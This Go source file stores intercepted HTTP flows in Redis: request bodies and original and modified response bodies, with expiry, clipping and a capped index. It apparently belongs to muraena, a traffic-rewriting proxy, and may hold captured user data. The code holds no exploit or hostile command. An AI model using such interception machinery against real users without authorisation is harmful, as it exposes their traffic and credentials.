package traffic

import (
	"encoding/json"
	"fmt"

	"github.com/gomodule/redigo/redis"

	"github.com/muraenateam/muraena/core/capture"
	"github.com/muraenateam/muraena/session"
)

const (
	indexKey = "traffic:flows"
)

func flowKey(id string) string { return fmt.Sprintf("traffic:flow:%s", id) }

func clip(s string, max int) (string, bool) {
	if len(s) > max {
		return s[:max], true
	}
	return s, false
}

// Truncate clips all body fields to maxBodyKB and sets Truncated.
func Truncate(f *capture.Flow, maxBodyKB int) {
	max := maxBodyKB * 1024
	if max <= 0 {
		return
	}
	var t1, t2, t3 bool
	f.ReqBody, t1 = clip(f.ReqBody, max)
	f.ResBodyOriginal, t2 = clip(f.ResBodyOriginal, max)
	f.ResBodyModified, t3 = clip(f.ResBodyModified, max)
	if t1 || t2 || t3 {
		f.Truncated = true
	}
}

// Save writes a flow, caps the ring to maxFlows, and sets a TTL.
func Save(f capture.Flow, maxFlows, ttlMinutes int) error {
	rc := session.RedisPool.Get()
	defer rc.Close()

	b, err := json.Marshal(f)
	if err != nil {
		return err
	}
	ttl := ttlMinutes * 60
	if ttl <= 0 {
		ttl = 3600
	}
	if _, err := rc.Do("SET", flowKey(f.ID), b, "EX", ttl); err != nil {
		return err
	}
	if _, err := rc.Do("LPUSH", indexKey, f.ID); err != nil {
		return err
	}
	if maxFlows > 0 {
		// keep only the newest maxFlows ids
		if _, err := rc.Do("LTRIM", indexKey, 0, maxFlows-1); err != nil {
			return err
		}
	}
	return nil
}

// List returns up to limit flows, newest first.
func List(limit int) ([]capture.Flow, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()
	if limit <= 0 {
		limit = 100
	}
	ids, err := redis.Strings(rc.Do("LRANGE", indexKey, 0, limit-1))
	if err != nil {
		return nil, err
	}
	var out []capture.Flow
	for _, id := range ids {
		f, ok, err := Get(id)
		if err != nil {
			return nil, err
		}
		if ok {
			out = append(out, *f)
		}
	}
	return out, nil
}

// Get returns a single flow (ok=false if expired/absent).
func Get(id string) (*capture.Flow, bool, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()
	b, err := redis.Bytes(rc.Do("GET", flowKey(id)))
	if err == redis.ErrNil {
		return nil, false, nil
	}
	if err != nil {
		return nil, false, err
	}
	var f capture.Flow
	if err := json.Unmarshal(b, &f); err != nil {
		return nil, false, err
	}
	return &f, true, nil
}

// Clear removes all traffic data.
func Clear() error {
	rc := session.RedisPool.Get()
	defer rc.Close()
	ids, _ := redis.Strings(rc.Do("LRANGE", indexKey, 0, -1))
	for _, id := range ids {
		_, _ = rc.Do("DEL", flowKey(id))
	}
	_, err := rc.Do("DEL", indexKey)
	return err
}

// Count returns the number of indexed flows.
func Count() (int, error) {
	rc := session.RedisPool.Get()
	defer rc.Close()
	return redis.Int(rc.Do("LLEN", indexKey))
}
